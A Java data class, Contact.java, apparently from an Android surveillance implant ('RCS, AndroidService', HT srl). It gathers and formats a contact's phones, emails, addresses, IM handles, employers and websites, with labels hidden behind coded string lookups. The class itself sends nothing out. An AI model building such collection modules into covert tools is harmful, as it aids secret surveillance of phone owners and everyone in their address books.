/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Contact.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module.task;

import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;

import com.android.networking.Messages;

public class Contact {
	private static final String TAG = "Contact"; //$NON-NLS-1$

	private final UserInfo userInfo;
	private final List<EmailInfo> emailInfo;
	private final List<PostalAddressInfo> paInfo;
	private final List<PhoneInfo> phoneInfo;
	private final List<ImInfo> imInfo;
	private final List<OrganizationInfo> orgInfo;
	private final List<WebsiteInfo> webInfo;

	public Contact(UserInfo u) {
		this.userInfo = u;
		this.emailInfo = new ArrayList<EmailInfo>();
		this.paInfo = new ArrayList<PostalAddressInfo>();
		this.phoneInfo = new ArrayList<PhoneInfo>();
		this.imInfo = new ArrayList<ImInfo>();
		this.orgInfo = new ArrayList<OrganizationInfo>();
		this.webInfo = new ArrayList<WebsiteInfo>();
	}

	public void add(EmailInfo u) {
		this.emailInfo.add(u);
	}

	public void add(PostalAddressInfo p) {
		this.paInfo.add(p);
	}

	public void add(PhoneInfo p) {
		this.phoneInfo.add(p);
	}

	public void add(ImInfo i) {
		this.imInfo.add(i);
	}

	public void add(OrganizationInfo o) {
		this.orgInfo.add(o);
	}

	public void add(WebsiteInfo w) {
		this.webInfo.add(w);
	}

	public UserInfo getUserInfo() {
		return userInfo;
	}

	public List<EmailInfo> getEmailInfo() {
		return emailInfo;
	}

	public List<PostalAddressInfo> getPaInfo() {
		return paInfo;
	}

	public List<PhoneInfo> getPhoneInfo() {
		return phoneInfo;
	}

	public List<ImInfo> getImInfo() {
		return imInfo;
	}

	public List<OrganizationInfo> getOrgInfo() {
		return orgInfo;
	}

	public List<WebsiteInfo> getWebInfo() {
		return webInfo;
	}

	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();

		sb.append(Messages.getString("16_0") + userInfo.getUserId()); //$NON-NLS-1$
		sb.append("\n" + Messages.getString("16_1") + userInfo.getCompleteName()); //$NON-NLS-1$
		sb.append("\n" + Messages.getString("16_2") + userInfo.getUserNickname()); //$NON-NLS-1$
		sb.append("\n" + Messages.getString("16_3") + userInfo.getUserNote() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		sb.append(getInfo());
		return sb.toString();
	}

	public String getInfo() {
		final StringBuffer sb = new StringBuffer();

		// Phone Info
		final ListIterator<PhoneInfo> pi = phoneInfo.listIterator();

		while (pi.hasNext()) {
			final PhoneInfo pinfo = pi.next();

			sb.append(Messages.getString("16_5") + pinfo.getPhoneNumber()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_6") + pinfo.getPhoneType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		// Email Info
		final ListIterator<EmailInfo> e = emailInfo.listIterator();

		while (e.hasNext()) {
			final EmailInfo einfo = e.next();

			sb.append(Messages.getString("16_8") + einfo.getEmail()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_9") + einfo.getEmailType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		// Postal Address Info
		final ListIterator<PostalAddressInfo> pa = paInfo.listIterator();

		while (pa.hasNext()) {
			final PostalAddressInfo painfo = pa.next();

			sb.append(Messages.getString("16_11") + painfo.getState()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_12") + painfo.getCountry()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_13") + painfo.getCity()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_14") + painfo.getStreet()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_15") + painfo.getPoBox()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_16") + painfo.getPostalCode()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_17") + painfo.getNeighbor()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_18") + painfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		// Im Info
		final ListIterator<ImInfo> im = imInfo.listIterator();

		while (im.hasNext()) {
			final ImInfo iminfo = im.next();

			sb.append(Messages.getString("16_20") + iminfo.getIm()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_21") + iminfo.getImType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		// Organization Info
		final ListIterator<OrganizationInfo> o = orgInfo.listIterator();

		while (o.hasNext()) {
			final OrganizationInfo oinfo = o.next();

			sb.append(Messages.getString("16_23") + oinfo.getCompanyName()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_24") + oinfo.getCompanyTitle()); //$NON-NLS-1$
			sb.append("\n" + Messages.getString("16_25") + oinfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		// Website Info
		final ListIterator<WebsiteInfo> w = webInfo.listIterator();

		while (w.hasNext()) {
			final WebsiteInfo winfo = w.next();

			sb.append(Messages.getString("16_27") + winfo.getWebsiteName() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		return sb.toString();
	}

	public long getId() {
		return getUserInfo().getUserId();
	}
}
